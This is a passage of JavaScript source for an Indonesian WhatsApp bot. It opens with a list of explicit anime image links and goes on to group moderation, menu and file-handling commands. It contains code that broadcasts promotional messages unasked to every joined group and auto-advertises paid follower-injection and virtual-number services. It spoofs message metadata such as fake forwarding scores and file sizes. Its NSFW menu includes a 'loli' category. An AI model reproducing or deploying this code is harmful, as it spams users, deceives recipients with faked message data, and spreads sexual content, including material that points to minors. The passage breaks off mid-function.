"https://media.discordapp.net/attachments/527959391446761473/578295988540932117/image0.png",
"https://media.discordapp.net/attachments/527959391446761473/578295355280457759/image0.jpg",
"https://media.discordapp.net/attachments/527959391446761473/575837526187835402/74635394_p0.png",
"https://media.discordapp.net/attachments/527959391446761473/575477218659139604/macciatto-28aciel0229-Anime-AO-Anime-Art-5183289.png",
"https://media.discordapp.net/attachments/527959391446761473/575477166771404820/hiragi-ringo-Anime-AO-Anime-Art-5183293.png",
"https://media.discordapp.net/attachments/527959391446761473/575108498636144640/ero-waifu-Rem-28re-zero29-Re-Zero-Kara-Hajimeru-Isekai-Seikatsu-Anime-5181899.png",
"https://media.discordapp.net/attachments/527959391446761473/574223805711384586/74541928_p0.jpg",
"https://media.discordapp.net/attachments/527959391446761473/572054221134888971/image0.jpg",
"https://media.discordapp.net/attachments/527959391446761473/571642065704845322/74398146_p1.jpg",
"https://media.discordapp.net/attachments/527959391446761473/571642063909552129/74398146_p0.jpg",
"https://media.discordapp.net/attachments/527959391446761473/570387521658290246/Konachan.com_-_274528_apron_ass_ass_grab_blonde_hair_blush_book_bow_breasts_cleavage_maid_male_origi.jpg",   
"https://media.discordapp.net/attachments/527959391446761473/569413547273093130/74285341_p0.png",
"https://media.discordapp.net/attachments/527959391446761473/568198898242289664/Konachan.com_-_269716_sample.jpg",
"https://media.discordapp.net/attachments/527959391446761473/568198854822985738/Konachan.com_-_260033_sample.jpg",
"https://media.discordapp.net/attachments/527959391446761473/568198737915281410/Konachan.com_-_258221_dokiyuri_drink_idolmaster_idolmaster_cinderella_girls_kurokawa_chiaki_maid.jpg",       
"https://media.discordapp.net/attachments/527959391446761473/568198734144471080/Konachan.com_-_227749_sample.jpg",
"https://media.discordapp.net/attachments/527959391446761473/568198734144471080/Konachan.com_-_227749_sample.jpg",
"https://media.discordapp.net/attachments/527959391446761473/568198715425292347/Konachan.com_-_232936_bed_blue_eyes_blue_hair_blush_bow_braids_breasts_censored_cleavage_cum_footjob.jpg",   
"https://media.discordapp.net/attachments/527959391446761473/567856327221706771/saki-saki-achiga-hen-Matsumi-Kuro-trista-28makkoivenus29-5138348.png",
"https://media.discordapp.net/attachments/527959391446761473/567759128060100627/arisugawa_natsuha_idolmaster_shiny_colors_and_etc_drawn_by_wasabi_nmrw4477__36b438983e3b3f3e99ff5e8b.png",   
"https://media.discordapp.net/attachments/527959391446761473/567292967103234062/54559599_p0.png",
"https://media.discordapp.net/attachments/527959391446761473/567047011568844831/Konachan.com_-_281407_apron_blush_breasts_brown_hair_cameltoe_cum_gloves_headdress_long_hair_maid_ni.png",   
"https://media.discordapp.net/attachments/527959391446761473/567045419398594591/f8fa5a3.jpg",
"https://media.discordapp.net/attachments/527959391446761473/567041161085190154/Konachan.com_-_281528_sample.png",
"https://media.discordapp.net/attachments/527959391446761473/567017638673252363/Konachan.com_-_281985_ass_azur_lane_brown_eyes_drink_elbow_gloves_food_fruit_fujima_takuya_gloves_lo.png",   
"https://media.discordapp.net/attachments/527959391446761473/561680566546857984/Konachan.png",
"https://cdn.discordapp.com/attachments/770948564947304448/770949690048380959/Hentai_Nation_20.jpg",
"https://images-ext-2.discordapp.net/external/qKu6CT8vnfvWk9A90TCHZCMSk-WYfJ78NM8yjawQGuU/%3Ffit%3D270%252C400%26ssl%3D1/https/i1.wp.com/manytoon.com/wp-content/uploads/2019/05/miss.jpg",
"https://images-ext-2.discordapp.net/external/H3mxlBUSkdq98OhtbA2OlmB5GcFJCpLKEwG94ggak1o/%3Ffit%3D270%252C400%26ssl%3D1/https/i1.wp.com/manytoon.com/wp-content/uploads/2019/07/Pheromone-Holic-manhwahentai.jpg",
"https://media.discordapp.net/attachments/527959259107950603/553360483315613739/22t.jpg",
"https://media.discordapp.net/attachments/527959259107950603/553360456392245248/21t.jpg",
"https://cdn.discordapp.com/attachments/707201738255368194/771335958271623168/504af0dc33851aacf0e5cdfd46094514.png",
"https://cdn.discordapp.com/attachments/770948564947304448/771000644152197130/710.jpg",
"https://cdn.discordapp.com/attachments/770948564947304448/771000747315560488/497-Fe67B-bfmcg.jpg",
"https://cdn.discordapp.com/attachments/770948564947304448/771001374086397962/0525-iWRn0JWF9EY.jpg",
"https://cdn.discordapp.com/attachments/770948564947304448/771001575933476884/0545-SwaxxBy0cAk.jpg",
"https://cdn.discordapp.com/attachments/770948564947304448/771001885883629588/569-6VBU3b08Y-A.jpg",
"https://cdn.discordapp.com/attachments/770948564947304448/771002102260563968/0585-GJ5pfHuOWkc.jpg",
"https://cdn.discordapp.com/attachments/770948564947304448/771002155427168301/590-upM3zPauvLw.jpg",
"https://cdn.discordapp.com/attachments/770948564947304448/771016377116655626/1653-52vm09z1VuM.jpg",
"https://cdn.discordapp.com/attachments/770948564947304448/771016584859746384/1684-Rhc9pVcoy4c.jpg",
"https://cdn.discordapp.com/attachments/770948564947304448/771018006133735434/1898_mIjFlf6bPc.jpg",
"https://cdn.discordapp.com/attachments/763827461250613268/771857665046872085/image0.gif",
"https://cdn.discordapp.com/attachments/707201738255368194/771861522757976064/1mu59y817hm41.png",
"https://cdn.discordapp.com/attachments/707201738255368194/771861594694352926/4a61e5528a0d1efb0ed163edc4cd31c1.png",
"https://cdn.discordapp.com/attachments/707201738255368194/771861708267585596/qakn1osmum451.png"
]

const NsfwEro = ero[Math.floor(Math.random() * ero.length)]
//~~~~~~~~~~ Event Settings ~~~~~~~~~//

if (global.db.settings.owneroffmode && global.db.settings.owneroffmode == true && !isCreator && !m.isGroup) {
return XPanz.sendMessage(m.chat, {text: `
Maaf Owner Bot Sedang *Offline*, 
Tunggu & Jangan Spam Chat! 
Ini Adalah Pesan Otomatis Auto Respon Ketika Owner Sedang Offline
`}, {quoted: qtext2})
}

if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].mute == true && !isCreator) return

if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].antilink == true) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text) && !isCreator && !m.isAdmin && m.isBotAdmin && !m.fromMe) {
var gclink = (`https://chat.whatsapp.com/` + await XPanz.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await XPanz.sendMessage(m.chat, {text: `*── Link Grup Terdeteksi*

@${m.sender.split("@")[0]} Maaf kamu akan saya kick, karna admin/ownerbot telah menyalakan fitur antilink grup lain!`, mentions: [m.sender]}, {quoted: m})
await XPanz.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
await sleep(1000)
await XPanz.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}}


if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].antilink2 == true) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text) && !isCreator && !m.isAdmin && m.isBotAdmin && !m.fromMe) {
var gclink = (`https://chat.whatsapp.com/` + await XPanz.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await XPanz.sendMessage(m.chat, {text: `*── Link Grup Terdeteksi*

@${m.sender.split("@")[0]} Maaf pesan kamu saya hapus, karna admin/ownerbot telah menyalakan fitur antilink grup lain!`, mentions: [m.sender]}, {quoted: m})
await XPanz.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
/*await sleep(1000)
await XPanz.groupParticipantsUpdate(m.chat, [m.sender], "remove")*/
}}


if (m.isGroup && db.settings.autopromosi == true) {
if (m.text.includes("https://") && !m.fromMe) {
await XPanz.sendMessage(m.chat, {text: `
*Skyzopedia Menyediakan 🌟*
* Panel Pterodactyl Server Private
* Script Bot WhatsApp
* Domain (Request Nama Domain & Free Akses Cloudflare)
* Nokos WhatsApp All Region (Tergantung Stok!)
* Jasa Fix/Edit/Rename & Tambah Fitur Script Bot WhatsApp
* Jasa Suntik Followers/Like/Views All Sosmed
* Jasa Install Panel Pterodactyl
* Dan Lain Lain Langsung Tanyakan Saja.

*🏠 Join Grup Bebas Promosi*
* *Grup Bebas Promosi 1 :*
https://chat.whatsapp.com/IP1KjO4OyM97ay2iEsSAFy
* *Grup Bebas Promosi 2 :*
https://chat.whatsapp.com/CWO0TqYeCVbIoY4YzsTxb7
* *Channel Testimoni :*
https://whatsapp.com/channel/0029VaYoztA47XeAhs447Y1s

*👤 Contact Skyzopedia*
* *WhatsApp Utama :*
+6285624297893
* *WhtasApp Cadangan :*
+628386890336
https://t.me/skyzodev
`}, {quoted: null})
}}

if (!isCmd) {
let check = list.find(e => e.cmd == body.toLowerCase())
if (check) {
await ArroganzzReply(check.respon)
}}


//~~~~~~~~~ Function Main ~~~~~~~~~~//

const example = (teks) => {
return `*Contoh :* ${prefix+command} ${teks}`
}

function generateRandomPassword() {
const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#%^&*';
const length = 10;
let password = '';
for (let i = 0; i < length; i++) {
const randomIndex = Math.floor(Math.random() * characters.length);
password += characters[randomIndex];
}
return password;
}

function generateRandomNumber(min, max) {
return Math.floor(Math.random() * (max - min + 1)) + min;
}

const ArroganzzReply = async (teks) => {
    const XcZReply = {
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: ` - XPanzZyy - Information - `,
                newsletterJid: global.idSaluran,
            },
            externalAdReply: {
                showAdAttribution: true,
                title: "⿻  ⌜ ⌁⃰ Arroganzz - Botz ⌁⃰ ⌟  ⿻", 
                body: "© By Arroganzz - Botz", 
                thumbnailUrl: { url: XPanzimg },
                sourceUrl: 'wa.me/6283170159916', 
            },
        },
        text: teks, 
    };
    return XPanz.sendMessage(m.chat, XcZReply, {
        quoted: m,
    });
};

const slideButton = async (jid, mention = []) => {
let imgsc = await prepareWAMessageMedia({ image: { url: XPanzimg }}, { upload: XPanz.waUploadToServer })
const msgii = await generateWAMessageFromContent(jid, {
ephemeralMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "*All Transaksi Open ✅*\n\n*Skyzopedia* Menyediakan Produk & Jasa Dibawah Ini ⬇️"
}), 
contextInfo: {
mentionedJid: mention
}, 
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: [{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*Skyzopedia Menyediakan 🌟*

* Panel Pterodactyl Server Private
* Script Bot WhatsApp
* Domain (Request Nama Domain & Free Akses Cloudflare)
* Nokos WhatsApp All Region (Tergantung Stok!)
* Jasa Fix/Edit/Rename & Tambah Fitur Script Bot WhatsApp
* Jasa Suntik Followers/Like/Views All Sosmed
* Jasa Install Panel Pterodactyl
* Dan Lain Lain Langsung Tanyakan Saja.

*🏠 Join Grup Bebas Promosi*
* *Grup  Bebas Promosi 1 :*
https://chat.whatsapp.com/BNrO2WHYBlD251ZhOuqDbz
* *Channel Testimoni :*
https://whatsapp.com/channel/0029VaYoztA47XeAhs447Y1s`, 
hasMediaAttachment: true,
...imgsc
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*List Panel Run Bot Private 🌟*

* Ram 1GB : Rp1000

* Ram 2 GB : Rp2000

* Ram 3 GB : Rp3000

* Ram 4 GB : Rp4000

* Ram 5 GB : Rp5000

* Ram 6 GB : Rp6000

* Ram 7 GB : Rp7000

* Ram 8 GB : Rp8000

* Ram 9 GB : Rp9000

* Ram Unlimited : Rp10.000

*Syarat & Ketentuan :*
* _Server private & kualitas terbaik!_
* _Script bot dijamin aman (anti drama/maling)_
* _Garansi 10 hari (1x replace)_
* _Server anti delay/lemot!_
* _Claim garansi wajib bawa bukti transaksi_`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}]
})
})}
}}, {userJid: m.sender, quoted: qlocJpm})
await XPanz.relayMessage(jid, msgii.message, {messageId: msgii.key.id})
}

//~~~~~~~~~~~ Command ~~~~~~~~~~~//

switch (command) {

case "menu": {
let teksnya = `
Haii @${m.sender.split("@")[0]},
Selamat ${ucapan()}
 
*── Arroganzz - Botz ──🚀*
Klik tombol menu dibawah ini untuk melihat semua fitur yang tersedia.
`
await XPanz.sendMessage(m.chat, {
  footer: `© Arroganzz - Botz`,
  buttons: [
    {
      buttonId: `.crodmenu`,
      buttonText: { displayText: 'Menu' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  document: fs.readFileSync("./package.json"),
  fileName: `</> Arroganzz - Botz </>`,
  mimetype: 'application/gzip',
  fileLength: 99999999999999,
  caption: teksnya,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
   forwardedNewsletterMessageInfo: {
   newsletterJid: global.idSaluran,
   newsletterName: global.namaSaluran
   }, 
    externalAdReply: {
      title: `${botname2} - v${versi}`,
      thumbnailUrl: XPanzimg,
      sourceUrl: linkWebsite,
      mediaType: 1,
      renderLargerThumbnail: true,
    },
  },
})
}
break

case "crodmenu": {
let teksnya = `> _*⿻  ⌜ ⌁⃰ Botz - Information ⌁⃰ ⌟  ⿻*_
> _*─ 丝 Botname : *${global.botname2}*_
> _*─ 丝 Version : *${global.versi}*_
> _*─ 丝 Mode : *${XPanz.public ? "Public": "Self"}*_
> _*─ 丝 Creator : @${global.owner}*_
> _*─ 丝 Uptime Vps : *${runtime(os.uptime())}*_
> _*─ 丝 Uptime Bot : *${runtime(process.uptime())}*_
  
> _*⿻  ⌜ ⌁⃰ User - Information ⌁⃰ ⌟  ⿻*_
> _*─ 丝 Your Status *(${isCreator ? "Author Botz" : isPremium ? "Premium User" : "Free User"})*_
  
> _*⿻  ⌜ ⌁⃰ Other - Menu ⌁⃰ ⌟  ⿻*_
> _*─ 丝 cekidch*_
> _*─ 丝 cekidgc*_
> _*─ 丝 qc*_
> _*─ 丝 brat*_
> _*─ 丝 emojigif*_
> _*─ 丝 emojimix*_
> _*─ 丝 readviewonce*_
> _*─ 丝 stickerwm*_
> _*─ 丝 sticker*_
> _*─ 丝 smeme*_
> _*─ 丝 animebrat*_
  
> _*⿻  ⌜ ⌁⃰ Search - Menu ⌁⃰ ⌟  ⿻*_
> _*─ 丝 yts*_
> _*─ 丝 apkmod*_
> _*─ 丝 pinterest*_
> _*─ 丝 gimage*_
> _*─ 丝 sfile*_
> _*─ 丝 playstore*_
> _*─ 丝 xnxx*_
> _*─ 丝 npmsearch*_
> _*─ 丝 tiktokstalk*_
> _*─ 丝 igstalk*_
> _*─ 丝 ytstalk*_
> _*─ 丝 carigc*_
  
> _*⿻  ⌜ ⌁⃰ Tools - Menu ⌁⃰ ⌟  ⿻*_
> _*─ 丝 tourl*_
> _*─ 丝 ssweb*_
> _*─ 丝 translate*_
> _*─ 丝 tohd*_
> _*─ 丝 removebg*_
> _*─ 丝 ocr*_
> _*─ 丝 shortlink*_
> _*─ 丝 shortlink2*_
> _*─ 丝 enc*_
> _*─ 丝 enchard*_
> _*─ 丝 telestalk*_
> _*─ 丝 upgithub*_
> _*─ 丝 sendngl*_
> _*─ 丝 cpaste*_
> _*─ 丝 banchat*_
> _*─ 丝 unbanchat*_
> _*─ 丝 listbanchat*_
> _*─ 丝 gpt*_
> _*─ 丝 zerogpt*_
> _*─ 丝 autoai ( On/Off )*_
> _*─ 丝 createweb*_
> _*─ 丝 delweb*_
> _*─ 丝 listweb*_
> _*─ 丝 html*_
> _*─ 丝 remove-wm*_
> _*─ 丝 upscale*_
> _*─ 丝 searchanime*_
> _*─ 丝 text2anime*_
> _*─ 丝 toanime*_
> _*─ 丝 tulisanime*_
> _*─ 丝 readqr*_
> _*─ 丝 createqr*_
  
> _*⿻  ⌜ ⌁⃰ Shop - Menu ⌁⃰ ⌟  ⿻*_
> _*─ 丝 buypanel*_
> _*─ 丝 buyadp*_
> _*─ 丝 buyscript*_
> _*─ 丝 buyvps*_
> _*─ 丝 buyjasajpm*_
> _*─ 丝 topupsaldo*_
> _*─ 丝 topupdiamond*_
  
> _*⿻  ⌜ ⌁⃰ Download - Menu ⌁⃰ ⌟  ⿻*_
> _*─ 丝 tiktok*_
> _*─ 丝 tiktokmp3*_
> _*─ 丝 facebook*_
> _*─ 丝 capcut*_
> _*─ 丝 doodstream*_
> _*─ 丝 instagram*_
> _*─ 丝 ytmp3*_
> _*─ 丝 ytmp4*_
> _*─ 丝 play*_
> _*─ 丝 playvid*_
> _*─ 丝 playspotify*_
> _*─ 丝 gitclone*_
> _*─ 丝 googledrive*_
> _*─ 丝 spotify*_
> _*─ 丝 terabox*_
> _*─ 丝 xnxxdl*_
  
> _*⿻  ⌜ ⌁⃰ Store - Menu ⌁⃰ ⌟  ⿻*_
> _*─ 丝 addrespon*_
> _*─ 丝 delrespon*_
> _*─ 丝 listrespon*_
> _*─ 丝 done*_
> _*─ 丝 proses*_
> _*─ 丝 jpm*_
> _*─ 丝 jpmht*_
> _*─ 丝 jpmtesti*_
> _*─ 丝 jpmallch*_
> _*─ 丝 addidch*_
> _*─ 丝 delidch*_
> _*─ 丝 jpmslide*_
> _*─ 丝 jpmslideht*_
> _*─ 丝 sendtesti*_
> _*─ 丝 pushkontak*_
> _*─ 丝 pushkontak2*_
> _*─ 丝 payment*_
> _*─ 丝 produk*_
> _*─ 丝 upswtag*_
  
> _*⿻  ⌜ ⌁⃰ DigitalOcean - Menu ⌁⃰ ⌟  ⿻*_
> _*─ 丝 cvps*_
> _*─ 丝 sisadroplet*_
> _*─ 丝 deldroplet*_
> _*─ 丝 listdroplet*_
> _*─ 丝 rebuild*_
> _*─ 丝 restartvps*_
  
> _*⿻  ⌜ ⌁⃰ Cpanel - Menu ⌁⃰ ⌟  ⿻*_
> _*─ 丝 delserverpanel*_
> _*─ 丝 listserverpanel*_
> _*─ 丝 addaksesgc*_
> _*─ 丝 delaksesgc*_
> _*─ 丝 listaksesgc*_
> _*─ 丝 1gb*_
> _*─ 丝 2gb*_
> _*─ 丝 3gb*_
> _*─ 丝 4gb*_
> _*─ 丝 5gb*_
> _*─ 丝 6gb*_
> _*─ 丝 7gb*_
> _*─ 丝 8gb*_
> _*─ 丝 9gb*_
> _*─ 丝 10gb*_
> _*─ 丝 unlimited*_
> _*─ 丝 cadmin*_
> _*─ 丝 delpanel*_
> _*─ 丝 deladmin*_
> _*─ 丝 listpanel*_
> _*─ 丝 listadmin*_
  
> _*⿻  ⌜ ⌁⃰ Installer - Menu ⌁⃰ ⌟  ⿻*_
> _*─ 丝 hackbackpanel*_
> _*─ 丝 installpanel*_
> _*─ 丝 uninstallpanel*_
> _*─ 丝 configurewings*_
> _*─ 丝 installtemaelysium*_
> _*─ 丝 installtemanook*_
> _*─ 丝 installtemanightcore*_
> _*─ 丝 installtemastellar*_
> _*─ 丝 installtemabilling*_
> _*─ 丝 installtemaenigma*_
> _*─ 丝 installtemanebula*_
> _*─ 丝 installdepend*_
> _*─ 丝 uninstalltema*_
> _*─ 丝 installtema ( Button )*_
  
> _*⿻  ⌜ ⌁⃰ Group - Menu ⌁⃰ ⌟  ⿻*_
> _*─ 丝 antilink*_
> _*─ 丝 antilink2*_
> _*─ 丝 blacklistjpm*_
> _*─ 丝 welcome*_
> _*─ 丝 add*_
> _*─ 丝 kick*_
> _*─ 丝 close*_
> _*─ 丝 open*_
> _*─ 丝 hidetag*_
> _*─ 丝 kudetagc*_
> _*─ 丝 leave*_
> _*─ 丝 tagall*_
> _*─ 丝 promote*_
> _*─ 丝 demote*_
> _*─ 丝 resetlinkgc*_
> _*─ 丝 linkgc*_

> _*⿻  ⌜ ⌁⃰ Cloudflare - Menu ⌁⃰ ⌟  ⿻*_
> _*─ 丝 adddomaincf*_
> _*─ 丝 deldomaincf*_
> _*─ 丝 listdomaincf*_
> _*─ 丝 clearsubdo*_
> _*─ 丝 ip*_

> _*⿻  ⌜ ⌁⃰ Owner - Menu ⌁⃰ ⌟  ⿻*_
> _*─ 丝 autoread*_
> _*─ 丝 autopromosi*_
> _*─ 丝 autoreadsw*_
> _*─ 丝 autotyping*_
> _*─ 丝 addowner*_
> _*─ 丝 delete*_
> _*─ 丝 blok*_
> _*─ 丝 unblok*_
> _*─ 丝 listowner*_
> _*─ 丝 delowner*_
> _*─ 丝 self/public*_
> _*─ 丝 svsc*_
> _*─ 丝 listsc*_
> _*─ 丝 delsc*_
> _*─ 丝 getsc*_
> _*─ 丝 subdomain*_
> _*─ 丝 setppbot*_
> _*─ 丝 clearsession*_
> _*─ 丝 clearchat*_
> _*─ 丝 resetdb*_
> _*─ 丝 restartbot*_
> _*─ 丝 backupsc*_
> _*─ 丝 getcase*_
> _*─ 丝 listgc*_
> _*─ 丝 joingc*_
> _*─ 丝 joinch*_
> _*─ 丝 upchannel*_
  `
await XPanz.sendMessage(m.chat, {
  footer: `© Arroganzz - Botz`,
  buttons: [
    {
      buttonId: `.owner`,
      buttonText: { displayText: 'Owner' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  document: fs.readFileSync("./package.json"),
  fileName: `</> Arroganzz - Botz </>`,
  mimetype: 'application/gzip',
  fileLength: 99999999999999,
  caption: teksnya,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
   forwardedNewsletterMessageInfo: {
   newsletterJid: global.idSaluran,
   newsletterName: global.namaSaluran
   }, 
    externalAdReply: {
      title: `${botname2} - V${versi}`,
      thumbnailUrl: XPanzimg,
      sourceUrl: "",
      mediaType: 1,
      renderLargerThumbnail: true,
    },
  },
})
}
break

case "nsfwmenu": {
let text = `> _*⿻  ⌜ ⌁⃰ Nsfw - Menu ⌁⃰ ⌟  ⿻*_
> _*─ 丝 cosplay*_
> _*─ 丝 bdsm*_
> _*─ 丝 ahegao*_
> _*─ 丝 loli*_
> _*─ 丝 tentacle*_
> _*─ 丝 ero*_
> _*─ 丝 nass*_
> _*─ 丝 gangbang*_
> _*─ 丝 masturbasi*_
> _*─ 丝 zetai*_
> _*─ 丝 hw*_
> _*─ 丝 hn*_
> _*─ 丝 hg*_
> _*─ 丝 hr*_
> _*─ 丝 trap*_
> _*─ 丝 hentaivid*_
> _*─ 丝 randomnsfw*_
> _*─ 丝 nsfw ( Button Coy )*_`
m.reply(text)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delete": case "del": {
if (m.isGroup) {
if (!isCreator && !m.isAdmin) return ArroganzzReply(mess.admin)
if (!m.quoted) return ArroganzzReply("reply pesannya")
if (m.quoted.fromMe) {
XPanz.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender}})
} else {
if (!m.isBotAdmin) return ArroganzzReply(mess.botAdmin)
XPanz.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender}})
}} else {
if (!isCreator) return ArroganzzReply(mess.owner)
if (!m.quoted) return ArroganzzReply(example("reply pesan"))
XPanz.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender}})
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "clsesi": case "clearsession": {
const dirsesi = fs.readdirSync("./session").filter(e => e !== "creds.json")
const dirsampah = fs.readdirSync("./library/database/sampah").filter(e => e !== "A")
for (const i of dirsesi) {
await fs.unlinkSync("./session/" + i)
}
for (const u of dirsampah) {
await fs.unlinkSync("./library/database/sampah/" + u)
}
ArroganzzReply(`*Berhasil membersihkan sampah ✅*
*${dirsesi.length}* sampah session\n*${dirsampah.length}* sampah file`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "unblok": {
if (!isCreator) return ArroganzzReply(global.mess.owner)
if (m.isGroup && !m.quoted && !text) return ArroganzzReply(example("@tag/nomornya"))
const mem = !m.isGroup ? m.chat : m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : ""
await XPanz.updateBlockStatus(mem, "unblock");
if (m.isGroup) XPanz.sendMessage(m.chat, {text: `Berhasil membuka blokiran @${mem.split('@')[0]}`, mentions: [mem]}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "svsc": {
if (!isCreator) return
if (!text || !text.endsWith(".zip")) return ArroganzzReply(example("cpanel.zip & reply scnya"))
if (!/zip/.test(mime)) return ArroganzzReply(example("cpanel.zip & reply scnya"))
if (!m.quoted) return ArroganzzReply(example("cpanel & reply scnya"))
let ff = await m.quoted.download()
let nama = text
await fs.writeFileSync("./library/database/savesc/"+nama, ff)
return ArroganzzReply(`Berhasil menyimpan script *${nama}.zip*`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listsc": {
if (!isCreator) return
let scnya = await fs.readdirSync("./library/database/savesc").filter(i => i !== "verif.js")
if (scnya.length < 1) return ArroganzzReply("Tidak ada script tersimpan")
let teks = ""
for (let e of scnya) {
teks += e + "\n"
}
ArroganzzReply(teks)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "sendsc": {
if (!isCreator) return 
let scnya = await fs.readdirSync("./library/database/savesc").filter(i => i !== "verif.js")
if (scnya.length < 1) return ArroganzzReply("Tidak ada script tersimpan")
if (!text) return ArroganzzReply(example("namasc|6285###"))
if (!text.split("|'")) return ArroganzzReply(example("namasc|6285###"))
const input = m.mentionedJid[0] ? m.mentionedJid[0] : text.split("|")[1].replace(/[^0-9]/g, "") + "@s.whatsapp.net"
var onWa = await XPanz.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return ArroganzzReply("Nomor tidak terdaftar di whatsapp")
let namasc = text.split("|")[0]
namasc = namasc.toLowerCase()
if (!scnya.includes(namasc)) return ArroganzzReply('Nama script tidak ditemukan')
await XPanz.sendMessage(input, {document: fs.readFileSync("./library/database/savesc/"+namasc), fileName: namasc, mimetype: "application/zip", caption: `Script ${namasc}`}, {quoted: m})
ArroganzzReply(`Berhasil mengirim script *${namasc}* ke ${input.split("@")[0]}`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "getsc": {
if (!isCreator) return 
let scnya = await fs.readdirSync("./library/database/savesc").filter(i => i !== "verif.js")
if (scnya.length < 1) return ArroganzzReply("Tidak ada script tersimpan")
if (!text) return ArroganzzReply(example("namasc"))
let namasc = text
namasc = namasc.toLowerCase()
if (!scnya.includes(namasc)) return ArroganzzReply('Nama script tidak ditemukan')
await XPanz.sendMessage(m.chat, {document: fs.readFileSync("./library/database/savesc/"+namasc), fileName: namasc, mimetype: "application/zip", caption: `Script ${namasc}`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delsc": {
if (!isCreator) return 
let scnya = await fs.readdirSync("./library/database/savesc").filter(i => i !== "verif.js")
if (scnya.length < 1) return ArroganzzReply("Tidak ada script tersimpan")
if (!text) return ArroganzzReply(example("namasc"))
let namasc = text
namasc = namasc.toLowerCase()
if (!scnya.includes(namasc)) return ArroganzzReply('Nama script tidak ditemukan')
await fs.unlinkSync("./library/database/savesc/"+namasc)
ArroganzzReply(`Berhasil menghapus script *${namasc}*`)
}
break
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'restartbot': {
if (!isCreator) return;
ArroganzzReply(`Restarting.....`)
await sleep(1000)
process.exit()
}
break 
        
case "sendtesti": case "testi": {
if (!isCreator) return ArroganzzReply(global.mess.owner)
if (!text) return ArroganzzReply(example("teks dengan mengirim foto"))
if (!/image/.test(mime)) return ArroganzzReply(example("teks dengan mengirim foto"))
const allgrup = await XPanz.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const teks = text
const jid = m.chat
const rest = await XPanz.downloadAndSaveMediaMessage(qmsg)
await ArroganzzReply(`Memproses jpm testimoni ke dalam channel & ${res.length} grup`)
await XPanz.sendMessage(global.idSaluran, {image: await fs.readFileSync(rest), caption: teks})
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await XPanz.sendMessage(i, {
  footer: `© WhatsApp Bots - 2025`,
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Beli Produk',
          sections: [
            {
              title: 'List Produk',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Panel Pterodactyl',
                  id: '.buypanel'
                },
                {
                  title: 'Admin Panel Pterodactyl',
                  id: '.buyadp'
                },                
                {
                  title: 'Vps (Virtual Private Server)',
                  id: '.buyvps'
                },
                {
                  title: 'Script Bot WhatsApp',
                  id: '.buysc'
                }, 
                 {
                  title: 'Digitalocean',
                  id: '.buydo'
                }, 
                {
                  title: 'Jasa Jpm Pesan',
